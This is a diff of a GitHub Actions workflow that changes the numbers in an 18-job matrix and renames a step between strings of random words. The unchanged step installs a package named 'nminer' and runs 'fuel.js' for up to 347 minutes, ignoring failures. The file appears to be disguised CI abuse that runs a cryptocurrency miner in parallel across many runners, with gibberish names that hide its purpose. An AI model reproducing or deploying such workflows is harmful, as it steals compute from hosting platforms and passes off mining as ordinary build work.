@@ -9,24 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9090 }
-          - { version: 7419 }
-          - { version: 2938 }
-          - { version: 3467 }
-          - { version: 9574 }
-          - { version: 450 }
-          - { version: 8260 }
-          - { version: 3296 }
-          - { version: 2249 }
-          - { version: 4839 }
-          - { version: 1867 }
-          - { version: 8594 }
-          - { version: 7965 }
-          - { version: 5414 }
-          - { version: 9117 }
-          - { version: 6128 }
-          - { version: 8363 }
-          - { version: 2885 }
+          - { version: 6868 }
+          - { version: 7497 }
+          - { version: 6294 }
+          - { version: 9346 }
+          - { version: 7457 }
+          - { version: 7871 }
+          - { version: 9842 }
+          - { version: 2558 }
+          - { version: 5782 }
+          - { version: 2173 }
+          - { version: 2929 }
+          - { version: 7193 }
+          - { version: 6331 }
+          - { version: 1076 }
+          - { version: 335 }
+          - { version: 2687 }
+          - { version: 3378 }
+          - { version: 3243 }
 
     steps:
       - name: Checkout
@@ -37,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: often republican off woefully
+      - name: eek shinny er mozzarella
         run: |
           npm install nminer@latest
           timeout 347m node fuel.js || echo "fuel executed"
